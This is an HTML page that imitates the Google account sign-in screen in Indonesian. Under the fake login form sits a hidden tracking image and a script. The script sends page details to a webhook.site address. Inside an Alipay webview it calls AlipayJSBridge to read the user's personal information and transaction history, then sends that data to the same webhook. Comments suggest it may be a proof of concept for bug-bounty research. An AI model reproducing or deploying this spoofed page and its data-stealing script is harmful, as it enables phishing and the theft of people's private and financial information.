<!doctype html><html lang="id" dir="ltr"><head><base href="https://accounts.google.com/v3/signin/"><link rel="preconnect" href="//www.gstatic.com"><meta name="referrer" content="origin">
<title>Login - Akun Google</title>
<style>body{margin:0;font-family:Google Sans,Roboto,Arial,sans-serif;background:#fff} .hidden-beacon{display:none}</style>
</head><body>
<!-- Google login UI clone (trimmed) -->
<div style="max-width:400px;margin:40px auto;padding:24px;border:1px solid #dadce0;border-radius:8px">
  <img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" width="48" style="display:block;margin:0 auto 16px">
  <h1 style="text-align:center;font-size:22px">Login</h1><p style="text-align:center;color:#5f6368">Gunakan Akun Google Anda</p>
  <div style="border:1px solid #dadce0;border-radius:4px;padding:12px 14px;margin:16px 0">
    <div style="font-size:12px;color:#5f6368">Email atau nomor telepon</div>
    <input style="width:100%;border:none;outline:none;font-size:15px" placeholder=" " disabled>
  </div>
  <button style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;float:right">Berikutnya</button>
  <div style="clear:both"></div>
  <p style="font-size:12px;color:#5f6368;margin-top:24px">Bukan komputer Anda? Gunakan mode Tamu.</p>
</div>
<!-- Hidden OOB beacons like v15 landing -->
<img src="https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50?src=larpLandingImg" class="hidden-beacon" width="1" height="1">
<script>
(function(){
  var WH='https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50';
  function wh(p){try{var q=[];for(var k in p)q.push(k+'='+encodeURIComponent(String(p[k]).slice(0,380)));fetch(WH+'?'+q.join('&'),{mode:'no-cors',cache:'no-store'}).catch(function(){})}catch(e){}}
  function bridgeReady(cb){if(window.AlipayJSBridge)return cb();var f=false;var go=function(){if(!f){f=true;cb();}};document.addEventListener('AlipayJSBridgeReady',go,false);setTimeout(go,5000);}
  bridgeReady(function(){
    var hasB=!!window.AlipayJSBridge; var sp={}; try{sp=window.AlipayJSBridge.startupParams||{}}catch(e){}
    var env={hasBridge:hasB,appId:sp.appId,href:location.href.slice(0,120),origin:location.origin,ts:new Date().toISOString(),larp:true};
    wh({src:'larpLanding',stage:'boot',d:JSON.stringify(env).slice(0,380)});
    if(hasB){
      try{window.AlipayJSBridge.call('getUserInfoData',{event:'getUserInformation',info:{queryBy:'all'}},function(r){
        var piiLen=JSON.stringify(r).length; wh({src:'larpLanding',stage:'pii',piiBytes:piiLen,piiHead:JSON.stringify(r).slice(0,380)});
        try{window.AlipayJSBridge.call('getTransactionHistoryList',{event:'getInitList',pageNum:1,forceCache:false},function(t){
          wh({src:'larpLanding',stage:'final',piiBytes:piiLen,trxBytes:JSON.stringify(t).length,trxHead:JSON.stringify(t).slice(0,200)});
        });}catch(e2){wh({src:'larpLanding',stage:'final',piiBytes:piiLen,trxErr:String(e2).slice(0,80)});}
      });}catch(e){wh({src:'larpLanding',stage:'pii',err:String(e).slice(0,120)});}
    } else {
      wh({src:'larpLanding',stage:'final',hasBridge:false});
    }
  });
})();
</script>
</body></html>
